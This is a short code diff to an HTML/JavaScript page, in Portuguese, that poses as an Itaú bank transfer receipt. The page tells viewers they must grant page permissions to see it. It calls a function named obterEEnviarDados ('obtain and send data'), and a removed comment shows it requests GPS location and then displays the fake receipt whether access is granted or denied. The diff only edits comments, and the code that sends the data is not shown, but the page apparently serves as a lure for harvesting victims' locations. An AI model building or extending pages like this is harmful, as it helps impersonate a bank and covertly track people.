@@ -34,7 +34,7 @@
   <p>Para visualizar, precisa permitir permissões da página.</p>
 </div>
 
-<!-- COMPROVANTE (sem mapa) -->
+<!-- COMPROVANTE (apenas texto) -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora"></span></div>
@@ -129,7 +129,6 @@ function obterEEnviarDados(origem) {
 
 function mostrarComprovante() {
   document.getElementById('spinnerBox').style.display='none';
-  // GPS negado OU permitido → comprovante
   document.getElementById('comprovante').style.display='block';
   document.getElementById('msgNegado').style.display='none';
 }
